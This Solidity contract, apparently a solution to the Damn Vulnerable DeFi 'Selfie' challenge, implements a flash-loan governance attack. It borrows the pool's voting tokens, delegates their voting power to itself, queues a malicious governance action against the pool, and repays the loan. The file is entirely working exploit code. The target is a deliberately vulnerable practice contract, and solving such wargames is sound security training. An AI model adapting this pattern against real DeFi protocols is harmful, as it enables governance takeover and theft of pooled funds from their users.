// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SelfiePool} from "./SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract AttackPool is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable votingToken;
    address public immutable owner;

    
    constructor(SelfiePool _pool,SimpleGovernance _governance,DamnValuableVotes _votingToken){
        pool = _pool;
        governance = _governance;
        votingToken = _votingToken;
        owner = msg.sender;
    } 
    
    function attack(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) public {
        pool.flashLoan(_receiver,_token,_amount,_data);

    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns(bytes32){
        require(initiator==address(this),"Unknow initiator");

        votingToken.delegate(address(this));
        governance.queueAction(address(pool),0,data);
        IERC20(token).approve(address(pool),amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}